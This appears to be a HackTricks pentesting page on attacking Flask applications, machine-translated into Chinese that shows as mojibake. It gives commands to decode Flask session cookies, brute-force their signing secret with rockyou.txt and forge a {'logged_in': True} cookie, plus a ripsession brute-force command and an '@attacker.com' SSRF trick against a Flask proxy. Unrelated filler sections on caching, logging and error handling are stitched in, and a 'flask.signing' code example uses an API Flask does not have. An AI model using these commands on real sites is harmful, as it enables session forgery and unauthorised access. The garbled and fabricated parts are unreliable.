# Flask

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**å¦‚æœä½ åœ¨ç©CTFï¼ŒFlaskåº”ç”¨ç¨‹åºå¯èƒ½ä¸**[**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**ç›¸å…³ã€‚**

## Cookies

é»˜è®¤çš„cookieä¼šè¯åç§°æ˜¯**`session`**ã€‚

### è§£ç å™¨

åœ¨çº¿Flask cookieè§£ç å™¨ï¼š[https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### æ‰‹åŠ¨è§£ç 

è·å–cookieçš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œç›´åˆ°ç¬¬ä¸€ä¸ªç‚¹ï¼Œå¹¶å¯¹å…¶è¿›è¡ŒBase64è§£ç >
```bash
echo "ImhlbGxvIg" | base64 -d
```
cookieä¹Ÿä½¿ç”¨å¯†ç è¿›è¡Œç­¾å

### **Flask-Unsign**

å‘½ä»¤è¡Œå·¥å…·ï¼Œé€šè¿‡çŒœæµ‹ç§˜é’¥æ¥è·å–ã€è§£ç ã€æš´åŠ›ç ´è§£å’Œæ„é€ Flaskåº”ç”¨ç¨‹åºçš„ä¼šè¯cookieã€‚

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **è§£ç  Cookie**

To decode a cookie, you can use various tools and techniques. One common method is to use a base64 decoder to decode the cookie value. Base64 encoding is commonly used to encode binary data into ASCII characters, and decoding it reverses the process.

Here is an example of how you can decode a cookie using Python and the Flask framework:

```python
import base64

from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    cookie_value = request.cookies.get('cookie_name')
    decoded_value = base64.b64decode(cookie_value).decode('utf-8')
    return f'Decoded cookie value: {decoded_value}'

if __name__ == '__main__':
    app.run()
```

In this example, we import the `base64` module and the `Flask` class from the Flask framework. We define a route for the root URL ("/") and retrieve the value of the cookie named "cookie_name" using `request.cookies.get()`. We then decode the cookie value using `base64.b64decode()` and convert it to a UTF-8 string using `.decode('utf-8')`. Finally, we return the decoded cookie value as the response.

Keep in mind that decoding a cookie may not always reveal sensitive information. It depends on how the cookie is encoded and what data it contains. Always exercise caution and ensure you have proper authorization before attempting to decode or manipulate cookies.
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **æš´åŠ›ç ´è§£**

Brute forceï¼ˆæš´åŠ›ç ´è§£ï¼‰æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç»œæ”»å‡»æŠ€æœ¯ï¼Œç”¨äºå°è¯•æ‰€æœ‰å¯èƒ½çš„å¯†ç ç»„åˆæ¥è·å–æœªç»æˆæƒçš„è®¿é—®æƒé™ã€‚åœ¨Webåº”ç”¨ç¨‹åºä¸­ï¼Œæš´åŠ›ç ´è§£é€šå¸¸ç”¨äºå°è¯•ç ´è§£ç”¨æˆ·è´¦æˆ·çš„å¯†ç ã€‚

æš´åŠ›ç ´è§£æ”»å‡»å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è¿›è¡Œï¼ŒåŒ…æ‹¬ä½¿ç”¨å­—å…¸æ–‡ä»¶ã€ä½¿ç”¨å¸¸è§å¯†ç åˆ—è¡¨æˆ–ä½¿ç”¨è‡ªåŠ¨ç”Ÿæˆçš„å¯†ç ç»„åˆã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ¥åŠ å¿«æš´åŠ›ç ´è§£çš„é€Ÿåº¦ï¼Œå¹¶å°è¯•å¤§é‡çš„å¯†ç ç»„åˆã€‚

ä¸ºäº†é˜²æ­¢æš´åŠ›ç ´è§£æ”»å‡»ï¼ŒWebåº”ç”¨ç¨‹åºå¯ä»¥é‡‡å–ä¸€äº›å®‰å…¨æªæ–½ï¼Œä¾‹å¦‚å®æ–½å¯†ç ç­–ç•¥ï¼ˆå¦‚å¼ºåˆ¶ä½¿ç”¨å¤æ‚å¯†ç ã€é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°ï¼‰ã€ä½¿ç”¨å¤šå› ç´ èº«ä»½éªŒè¯ã€å®æ–½å¸æˆ·é”å®šæœºåˆ¶ç­‰ã€‚

ä½œä¸ºæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£æŠ€æœ¯æ¥æµ‹è¯•Webåº”ç”¨ç¨‹åºçš„å¯†ç å®‰å…¨æ€§ï¼Œå¹¶å‘å¼€å‘äººå‘˜æä¾›æ”¹è¿›å»ºè®®ï¼Œä»¥ç¡®ä¿ç”¨æˆ·è´¦æˆ·çš„å®‰å…¨æ€§ã€‚
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **ç­¾å**

Signing is a process used to verify the authenticity and integrity of data. In the context of web applications, signing is often used to ensure that data sent between the client and the server has not been tampered with.

ç­¾åæ˜¯ä¸€ç§ç”¨äºéªŒè¯æ•°æ®çš„çœŸå®æ€§å’Œå®Œæ•´æ€§çš„è¿‡ç¨‹ã€‚åœ¨Webåº”ç”¨ç¨‹åºçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œç­¾åé€šå¸¸ç”¨äºç¡®ä¿åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å‘é€çš„æ•°æ®æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚

#### **Session Management**

ä¼šè¯ç®¡ç†

Session management is an important aspect of web application security. It involves the management and control of user sessions, which are used to maintain state and track user interactions on a website.

ä¼šè¯ç®¡ç†æ˜¯Webåº”ç”¨ç¨‹åºå®‰å…¨çš„é‡è¦æ–¹é¢ã€‚å®ƒæ¶‰åŠç®¡ç†å’Œæ§åˆ¶ç”¨æˆ·ä¼šè¯ï¼Œç”¨äºç»´æŠ¤çŠ¶æ€å¹¶è·Ÿè¸ªç”¨æˆ·åœ¨ç½‘ç«™ä¸Šçš„äº¤äº’ã€‚

#### **Input Validation**

è¾“å…¥éªŒè¯

Input validation is the process of ensuring that user input is valid and safe before it is processed by a web application. This is crucial for preventing various types of attacks, such as SQL injection and cross-site scripting (XSS).

è¾“å…¥éªŒè¯æ˜¯ç¡®ä¿ç”¨æˆ·è¾“å…¥åœ¨è¢«Webåº”ç”¨ç¨‹åºå¤„ç†ä¹‹å‰æ˜¯æœ‰æ•ˆå’Œå®‰å…¨çš„è¿‡ç¨‹ã€‚è¿™å¯¹äºé˜²æ­¢å„ç§ç±»å‹çš„æ”»å‡»éå¸¸é‡è¦ï¼Œä¾‹å¦‚SQLæ³¨å…¥å’Œè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ã€‚

#### **Error Handling**

é”™è¯¯å¤„ç†

Error handling is the process of managing and responding to errors that occur during the execution of a web application. Proper error handling is important for maintaining the security and stability of a web application.

é”™è¯¯å¤„ç†æ˜¯åœ¨Webåº”ç”¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ç®¡ç†å’Œå“åº”é”™è¯¯çš„è¿‡ç¨‹ã€‚é€‚å½“çš„é”™è¯¯å¤„ç†å¯¹äºç»´æŠ¤Webåº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’Œç¨³å®šæ€§éå¸¸é‡è¦ã€‚

#### **Access Control**

è®¿é—®æ§åˆ¶

Access control is the process of determining what actions a user is allowed to perform within a web application. It involves defining and enforcing rules and restrictions to ensure that only authorized users can access certain resources or perform certain actions.

è®¿é—®æ§åˆ¶æ˜¯ç¡®å®šç”¨æˆ·åœ¨Webåº”ç”¨ç¨‹åºä¸­å…è®¸æ‰§è¡Œå“ªäº›æ“ä½œçš„è¿‡ç¨‹ã€‚å®ƒæ¶‰åŠå®šä¹‰å’Œæ‰§è¡Œè§„åˆ™å’Œé™åˆ¶ï¼Œä»¥ç¡®ä¿åªæœ‰æˆæƒç”¨æˆ·å¯ä»¥è®¿é—®æŸäº›èµ„æºæˆ–æ‰§è¡ŒæŸäº›æ“ä½œã€‚

#### **Caching**

ç¼“å­˜

Caching is a technique used to store and retrieve frequently accessed data in order to improve the performance of a web application. It involves storing copies of data in a cache, which can be quickly accessed instead of retrieving the data from its original source.

ç¼“å­˜æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨å’Œæ£€ç´¢é¢‘ç¹è®¿é—®çš„æ•°æ®ä»¥æé«˜Webåº”ç”¨ç¨‹åºæ€§èƒ½çš„æŠ€æœ¯ã€‚å®ƒæ¶‰åŠå°†æ•°æ®çš„å‰¯æœ¬å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œå¯ä»¥å¿«é€Ÿè®¿é—®è€Œä¸æ˜¯ä»å…¶åŸå§‹æ¥æºæ£€ç´¢æ•°æ®ã€‚

#### **Logging and Monitoring**

æ—¥å¿—è®°å½•å’Œç›‘æ§

Logging and monitoring are important for detecting and responding to security incidents in a web application. Logging involves recording events and activities that occur within the application, while monitoring involves actively observing and analyzing the application's behavior to identify any suspicious or malicious activity.

æ—¥å¿—è®°å½•å’Œç›‘æ§å¯¹äºæ£€æµ‹å’Œå“åº”Webåº”ç”¨ç¨‹åºä¸­çš„å®‰å…¨äº‹ä»¶éå¸¸é‡è¦ã€‚æ—¥å¿—è®°å½•æ¶‰åŠè®°å½•åº”ç”¨ç¨‹åºå†…å‘ç”Ÿçš„äº‹ä»¶å’Œæ´»åŠ¨ï¼Œè€Œç›‘æ§åˆ™æ¶‰åŠä¸»åŠ¨è§‚å¯Ÿå’Œåˆ†æåº”ç”¨ç¨‹åºçš„è¡Œä¸ºï¼Œä»¥è¯†åˆ«ä»»ä½•å¯ç–‘æˆ–æ¶æ„æ´»åŠ¨ã€‚
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### ä½¿ç”¨ä¼ ç»Ÿæ–¹å¼è¿›è¡Œç­¾åï¼ˆæ—§ç‰ˆæœ¬ï¼‰

In older versions of Flask, the `signing` module was used to sign cookies and other data. This module provided a way to ensure the integrity and authenticity of the data being transmitted.

åœ¨æ—§ç‰ˆæœ¬çš„Flaskä¸­ï¼Œä½¿ç”¨`signing`æ¨¡å—å¯¹cookieå’Œå…¶ä»–æ•°æ®è¿›è¡Œç­¾åã€‚è¯¥æ¨¡å—æä¾›äº†ä¸€ç§ç¡®ä¿ä¼ è¾“æ•°æ®çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§çš„æ–¹å¼ã€‚

To sign data using the legacy method, you can import the `signing` module and use the `sign` function. This function takes the data to be signed and a secret key as parameters.

è¦ä½¿ç”¨ä¼ ç»Ÿæ–¹æ³•å¯¹æ•°æ®è¿›è¡Œç­¾åï¼Œå¯ä»¥å¯¼å…¥`signing`æ¨¡å—å¹¶ä½¿ç”¨`sign`å‡½æ•°ã€‚è¯¥å‡½æ•°æ¥å—è¦ç­¾åçš„æ•°æ®å’Œä¸€ä¸ªå¯†é’¥ä½œä¸ºå‚æ•°ã€‚

```python
from flask import signing

data = "Hello, world!"
secret_key = "my_secret_key"

signed_data = signing.sign(data, secret_key)
```

The `sign` function returns a signed string that can be transmitted along with the data. To verify the signature, you can use the `unsign` function.

`sign`å‡½æ•°è¿”å›ä¸€ä¸ªå·²ç­¾åçš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä¸æ•°æ®ä¸€èµ·ä¼ è¾“ã€‚è¦éªŒè¯ç­¾åï¼Œå¯ä»¥ä½¿ç”¨`unsign`å‡½æ•°ã€‚

```python
verified_data = signing.unsign(signed_data, secret_key)
```

The `unsign` function will raise a `BadSignature` exception if the signature is invalid or if the data has been tampered with.

å¦‚æœç­¾åæ— æ•ˆæˆ–æ•°æ®è¢«ç¯¡æ”¹ï¼Œ`unsign`å‡½æ•°å°†å¼•å‘`BadSignature`å¼‚å¸¸ã€‚

It is important to note that the legacy signing method is not as secure as the current method provided by Flask. It is recommended to upgrade to the latest version of Flask and use the new signing method for improved security.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¼ ç»Ÿçš„ç­¾åæ–¹æ³•ä¸å¦‚Flaskæä¾›çš„å½“å‰æ–¹æ³•å®‰å…¨ã€‚å»ºè®®å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬çš„Flaskï¼Œå¹¶ä½¿ç”¨æ–°çš„ç­¾åæ–¹æ³•ä»¥æé«˜å®‰å…¨æ€§ã€‚
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

å‘½ä»¤è¡Œå·¥å…·ï¼Œä½¿ç”¨ä½¿ç”¨flask-unsignç”Ÿæˆçš„cookieå¯¹ç½‘ç«™è¿›è¡Œæš´åŠ›ç ´è§£ã€‚

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### ä½¿ç”¨SQLmapåœ¨Flaskä¼šè¯cookieä¸­è¿›è¡ŒSQLæ³¨å…¥

[**è¿™ä¸ªä¾‹å­**](../../pentesting-web/sql-injection/sqlmap/#eval) ä½¿ç”¨sqlmapçš„`eval`é€‰é¡¹æ¥ä½¿ç”¨å·²çŸ¥çš„å¯†é’¥è‡ªåŠ¨ç­¾åflaskçš„payloadã€‚

## Flaskä»£ç†åˆ°SSRF

[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) è§£é‡Šäº†Flaskå¦‚ä½•å…è®¸ä»¥å­—ç¬¦â€œ@â€å¼€å¤´çš„è¯·æ±‚ã€‚
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
åœ¨ä»¥ä¸‹æƒ…å†µä¸­ï¼š
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
å¯ä»¥å…è®¸è¾“å…¥ç±»ä¼¼ "@attacker.com" çš„å†…å®¹ï¼Œä»¥å¼•å‘ SSRF æ”»å‡»ã€‚

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒæœ€å…ˆè¿›çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­å®£ä¼ ä½ çš„å…¬å¸å—ï¼Ÿæˆ–è€…æƒ³è¦è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
